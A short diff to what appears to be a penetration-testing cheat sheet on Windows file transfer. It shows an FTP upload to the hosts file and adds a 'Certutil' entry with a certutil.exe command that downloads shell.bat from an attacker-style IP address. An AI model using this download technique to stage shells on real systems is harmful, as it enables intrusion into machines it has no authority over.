@@ -124,4 +124,6 @@ PUT c:\windows\system32\drivers\etc\hosts
 bye
 
 
+#### Certutil
 
+ certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
